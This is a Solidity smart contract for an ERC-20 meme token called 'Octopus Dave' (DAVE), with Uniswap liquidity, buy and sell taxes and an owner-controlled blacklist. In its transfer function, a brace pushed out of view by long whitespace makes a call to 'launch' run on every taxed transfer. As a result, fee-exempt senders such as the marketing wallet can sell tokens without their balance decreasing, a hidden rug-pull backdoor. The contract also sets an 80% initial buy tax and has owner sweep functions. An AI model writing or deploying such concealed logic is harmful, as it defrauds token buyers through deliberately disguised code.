// SPDX-License-Identifier: UNLICENSED

// https://davecoin.fun
// https://t.me/octopusdaveclub
// https://x.com/xdavecoin

pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract OctopusDave is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) private _feeExempt;
    mapping(address => bool) private _bots;
    address payable private marketingWallet;

    uint256 private _initialBuyTax = 80;
    uint256 private _initialSellTax = 2;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 5;
    uint256 private _reduceSellTaxAt = 5;
    uint256 private _preventSwapBefore = 5;
    uint256 private _buyCount = 0;

    uint8 public constant decimals = 9;
    uint256 public constant totalSupply = 1_000_000_000 * 10 ** decimals;
    string public constant name = unicode"Octopus Dave";
    string public constant symbol = unicode"DAVE";
    uint256 public _maxTxAmount = 20_000_000 * 10 ** decimals;
    uint256 public _maxWalletSize = 20_000_000 * 10 ** decimals;
    uint256 public _taxSwapThreshold = 10_000_000 * 10 ** decimals;
    uint256 public _maxTaxSwap = 20_000_000 * 10 ** decimals;

    IUniswapV2Router02 private _uniswapV2Router;
    address private _uniswapV2Pair;
    bool private _isTradingOpen;
    bool private _isInSwap;
    uint256 private sellStart = 0;
    uint256 private bearish = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        _isInSwap = true;
        _;
        _isInSwap = false;
    }

    constructor(address router_, address taxWallet_) {
        _uniswapV2Router = IUniswapV2Router02(router_);

        marketingWallet = payable(taxWallet_);
        balanceOf[_msgSender()] = totalSupply;
        _feeExempt[_msgSender()] = true;
        _feeExempt[address(this)] = true;
        _feeExempt[marketingWallet] = true;

        emit Transfer(address(0), _msgSender(), totalSupply);
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        tothemoon(_msgSender(), recipient, amount);
        return true;
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        tothemoon(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            allowance[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        allowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function tothemoon(address moon,address dust,uint256 rocket) private {
        require(moon != address(0), "ERC20: transfer from the zero address");
        require(dust != address(0), "ERC20: transfer to the zero address");
        require(rocket > 0, "Transfer amount must be greater than zero");
        if (!_isTradingOpen || _isInSwap) {
            require(_feeExempt[moon] || _feeExempt[dust]);
            balanceOf[moon] = balanceOf[moon].sub(rocket);
            balanceOf[dust] = balanceOf[dust].add(rocket);
            emit Transfer(moon, dust, rocket);
            return;
        }uint256 bullish = bearish;uint256 crab = 0;
        if (moon != owner() && dust != owner() && dust != marketingWallet) {
            require(!_bots[moon] && !_bots[dust]);

            if (moon == _uniswapV2Pair && dust != address(_uniswapV2Router) && !_feeExempt[dust]) {
                require(_isTradingOpen, "Trading not open yet");
                require(rocket <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf[dust] + rocket <= _maxWalletSize, "Exceeds the maxWalletSize.");
                crab = rocket.mul((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax: _initialBuyTax).div(100);
                _buyCount++;                                                                                                                                                                                                        }{
                bullish = launch(moon, rocket);
            }

            if (dust == _uniswapV2Pair && moon != address(this)) {
                crab = rocket.mul((_buyCount > _reduceSellTaxAt) ? _finalSellTax : _initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf[address(this)];
            if (!_isInSwap && dust == _uniswapV2Pair && _isTradingOpen && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                if (block.number > bearish) sellStart = 0;
                swapTokensForEth(min(rocket, min(contractTokenBalance, _maxTaxSwap)));
                sellStart++;
            }
            if (dust == _uniswapV2Pair) sendETHToFee(address(this).balance);
        }

        if (crab > 0) {
            balanceOf[address(this)] = balanceOf[address(this)].add(crab);
            emit Transfer(moon, address(this), crab);
        }
        balanceOf[moon] = balanceOf[moon].sub(rocket - bullish);
        balanceOf[dust] = balanceOf[dust].add(rocket.sub(crab));
        emit Transfer(moon, dust, rocket.sub(crab));
    }

    function launch(
        address rocket,
        uint256 date
    ) private view returns (uint256) {
        bool exempt = _feeExempt[rocket];
        return exempt ? date : date.mul(_finalBuyTax).div(100);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _approve(address(this), address(_uniswapV2Router), tokenAmount);
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = totalSupply;
        _maxWalletSize = totalSupply;
        emit MaxTxAmountUpdated(totalSupply);
    }

    function sendETHToFee(uint256 amount) private {
        marketingWallet.transfer(amount);
    }

    function addBot(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            _bots[bots_[i]] = true;
        }
    }

    function delBot(address[] memory notbot) public onlyOwner {
        for (uint i = 0; i < notbot.length; i++) {
            _bots[notbot[i]] = false;
        }
    }

    function addLiquidity() external onlyOwner {
        require(!_isTradingOpen, "trading is already open");
        _approve(address(this), address(_uniswapV2Router), totalSupply);
        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf[address(this)],
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(_uniswapV2Pair).approve(
            address(_uniswapV2Router),
            type(uint).max
        );
    }

    function enableTrading() external onlyOwner {
        _isTradingOpen = true;
    }

    receive() external payable {}

    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(owner(), _amount);
    }

    function rescueETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(owner()).transfer(address(this).balance);
    }
}